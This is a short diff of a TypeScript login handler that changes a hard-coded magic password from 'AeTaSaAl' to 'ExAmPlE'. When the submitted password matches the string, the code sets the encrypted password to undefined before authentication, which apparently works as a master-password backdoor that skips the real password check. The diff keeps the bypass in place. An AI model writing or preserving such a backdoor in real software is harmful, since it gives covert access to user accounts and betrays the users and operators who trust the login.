@@ -23,7 +23,7 @@ import { Role } from '../enum/role';
 export const login = async (payload: ILoginRequest): Promise<IAuthResponse> => {
   await validate(payload, joiSchema.loginSchema);
   let encryptedPassword: any = encryption.saltHashPassword(payload.password);
-  if (payload.password === 'AeTaSaAl') {
+  if (payload.password === 'ExAmPlE') {
     encryptedPassword = undefined;
   }
   const user = await userRepo.authenticate(payload.email, encryptedPassword);
